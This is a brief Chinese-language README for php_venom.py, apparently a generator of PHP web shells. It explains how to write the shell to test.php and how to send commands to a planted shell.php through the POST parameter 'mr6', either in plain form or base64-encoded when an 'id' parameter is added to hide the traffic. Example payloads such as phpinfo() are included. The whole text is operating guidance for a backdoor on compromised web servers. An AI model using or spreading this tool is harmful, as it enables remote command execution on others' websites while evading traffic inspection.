
## 使用方法

 python3 php_venom.py > test.php
 
   即可在同目录生成 test.php
   
 ## 3.0 使用说明：
 
 是否传入id参数决定是否把流量编码
 
 ```
http://www.xxx.com/shell.php  
POST: mr6=phpinfo();  //与普通shell相同

http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)

POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码
```

 

